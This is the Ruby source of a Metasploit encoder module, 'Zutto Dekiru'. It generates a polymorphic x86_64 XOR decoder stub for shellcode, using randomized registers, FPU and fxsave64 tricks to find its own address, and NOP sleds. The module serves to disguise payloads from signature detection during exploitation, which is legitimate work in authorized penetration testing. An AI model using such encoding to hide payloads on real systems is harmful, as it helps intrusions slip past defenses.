require 'metasm'
require 'msf/core'
require 'rex/nop/opty2'

class MetasploitModule < Msf::Encoder::Xor

  Rank = ManualRanking

  def initialize
    super(
      'Name'             => 'Zutto Dekiru',
      'Version'          => '$Revision: 14774 $',
      'Description'      => 'Inspired by shikata_ga_nai using fxsave64 to work under x86_64 systems.',
      'Author'           => 'agix',
      'Arch'             => ARCH_X86_64,
      'License'          => MSF_LICENSE,
      'EncoderType'      => Msf::Encoder::Type::Raw,
      'Decoder'          =>
      {
        'KeySize'    => 8,
        'KeyPack'    => 'Q'
      }
    )
  end

  @@cpu64 = Metasm::X86_64.new
  def assemble(src, cpu=@@cpu64)
    Metasm::Shellcode.assemble(cpu, src).encode_string
  end


  def fxsave64(reg)
    case reg
    when "rax"
      return "\x48\x0f\xae\x00"
    when "rbx"
      return "\x48\x0f\xae\x03"
    when "rcx"
      return "\x48\x0f\xae\x01"
    when "rdx"
      return "\x48\x0f\xae\x02"
    when "rsi"
      return "\x48\x0f\xae\x06"
    when "rdi"
      return "\x48\x0f\xae\x07"
    when "rbp"
      return "\x48\x0f\xae\x45\x00"
    when "r8"
      return "\x49\x0f\xae\x00"
    when "r9"
      return "\x49\x0f\xae\x01"
    when "r10"
      return "\x49\x0f\xae\x02"
    when "r11"
      return "\x49\x0f\xae\x03"
    when "r12"
      return "\x49\x0f\xae\x04\x24"
    when "r13"
      return "\x49\x0f\xae\x45\x00"
    when "r14"
      return "\x49\x0f\xae\x06"
    when "r15"
      return "\x49\x0f\xae\x07"
    end
  end

  def nop(length,save_registers=[])
    test = Rex::Nop::Opty2.new('',save_registers)
    return test.generate_sled(length)
  end

  # Indicate that this module can preserve some registers
  def can_preserve_registers?
    true
  end
  #
  # Returns the set of FPU instructions that can be used for the FPU block of
  # the decoder stub.
  #
  def fpu_instructions
    fpus = []

    0xe8.upto(0xee) { |x| fpus << "\xd9" + x.chr }
    0xc0.upto(0xcf) { |x| fpus << "\xd9" + x.chr }
    0xc0.upto(0xdf) { |x| fpus << "\xda" + x.chr }
    0xc0.upto(0xdf) { |x| fpus << "\xdb" + x.chr }
    0xc0.upto(0xc7) { |x| fpus << "\xdd" + x.chr }

    fpus << "\xd9\xd0"
    fpus << "\xd9\xe1"
    fpus << "\xd9\xf6"
    fpus << "\xd9\xf7"
    fpus << "\xd9\xe5"

    # This FPU instruction seems to fail consistently on Linux
    #fpus << "\xdb\xe1"

    fpus
  end

  def rand_string(length)
    o = [('0'..'9'),('a'..'z'),('A'..'Z')].map{|i| i.to_a}.flatten;
    string = (0..(length-1)).map{ o[rand(o.length)] }.join;

    return string
  end

  def xor_string(text,key)
    text.length.times {|n| text[n] = (text[n].ord^key[n.modulo(key.length)].ord).chr }
    return text
  end


  def ordered_random_merge(a,b)
    a, b = a.dup, b.dup
    a.map{rand(b.size+1)}.sort.reverse.each do |index|
      b.insert(index, a.pop)
    end
    b
  end

  def encode_block(state, block)
    allowedReg = [
      ["rax",  "eax",  "ax",   "al"  ],
      ["rbx",  "ebx",  "bx",   "bl"  ],
      ["rcx",  "ecx",  "cx",   "cl"  ],
      ["rdx",  "edx",  "dx",   "dl"  ],
      ["rsi",  "esi",  "si",   "sil" ],
      ["rdi",  "edi",  "di",   "dil" ],
      ["rbp",  "ebp",  "bp",   "bpl" ],
      ["r8",   "r8d",  "r8w",  "r8b" ],
      ["r9",   "r9d",  "r9w",  "r9b" ],
      ["r10",  "r10d", "r10w", "r10b"],
      ["r11",  "r11d", "r11w", "r11b"],
      ["r12",  "r12d", "r12w", "r12b"],
      ["r13",  "r13d", "r13w", "r13b"],
      ["r14",  "r14d", "r14w", "r14b"],
      ["r15",  "r15d", "r15w", "r15b"],
    ]
    allowedReg.delete_if { |reg| if datastore['SaveRegisters']; datastore['SaveRegisters'].include?(reg.first); end }
    allowedReg.shuffle!

    if block.length%8 != 0
      block += nop(8-(block.length%8))
    end

    regType = 3

    if (block.length/8) > 0xff
      regType=2
    end

    if (block.length/8) > 0xffff
      regType=1
    end

    if (block.length/8) > 0xffffffff
      regType=0
    end

    regKey  = allowedReg[0][0]
    regSize = allowedReg[3]
    regRip  = allowedReg[1][0]
    regEnv  = allowedReg[2]

    flipCoin = rand(2)

    fpuOpcode = Rex::Poly::LogicalBlock.new('fpu',
                                            *fpu_instructions)

    fpu = []
    fpu << ["fpu",fpuOpcode.generate([], nil, state.badchars)]

    sub = (rand(0xd00)&0xfff0)+0xf000
    lea = []
    if flipCoin==0
      lea << ["lea",  assemble("mov %s, rsp"%regEnv[0])]
      lea << ["lea1", assemble("and "+regEnv[2]+", 0x%x"%sub)]
    else
      lea << ["lea",  assemble("push rsp")]
      lea << ["lea1", assemble("pop "+regEnv[0])]
      lea << ["lea2", assemble("and "+regEnv[2]+", 0x%x"%sub)]
    end

    fpuLea = ordered_random_merge(fpu, lea)
    fpuLea << ["fpu1", fxsave64(regEnv[0])] # fxsave64 doesn't seem to exist in metasm

    keyIns = [["key",  assemble("mov "+regKey+", 0x%x"%state.key)]]

    size = []
    size << ["size",assemble("xor "+regSize[0]+", "+regSize[0])]
    size << ["size", assemble("mov "+regSize[regType]+", 0x%x"% (block.length/8))]

    getrip=0

    a = ordered_random_merge(size, keyIns)
    decodeHeadTab = ordered_random_merge(a, fpuLea)

    decodeHeadTab.length.times { |i| getrip=i if decodeHeadTab[i][0]=="fpu"}

    decodeHead = decodeHeadTab.map { |j,i| i.to_s }.join

    flipCoin = rand(2)

    if flipCoin==0
      decodeHead += assemble("mov "+regRip+", ["+regEnv[0]+" + 0x8]")
    else
      decodeHead += assemble("add "+regEnv[0]+", 0x8")
      decodeHead += assemble("mov "+regRip+", ["+regEnv[0]+"]")
    end


    decodeHeadSize=decodeHead.length
    getrip.times { |i| decodeHeadSize-=decodeHeadTab[i][1].length }

    loopCode =  assemble("dec "+regSize[0])
    loopCode += assemble("xor ["+regRip+"+("+regSize[0]+"*8) + 0x7f], "+regKey)
    loopCode += assemble("test "+regSize[0]+", "+regSize[0])

    payloadOffset = decodeHeadSize+loopCode.length+2

    loopCode =  assemble("dec "+regSize[0])
    loopCode += assemble("xor ["+regRip+"+("+regSize[0]+"*8) + 0x"+payloadOffset.to_s(16)+"], "+regKey)
    loopCode += assemble("test "+regSize[0]+", "+regSize[0])

    jnz = "\x75"+(0x100-(loopCode.length+2)).chr

    decode = decodeHead+loopCode+jnz
    encode = xor_string(block, [state.key].pack('Q'))

    return decode + encode
  end


end
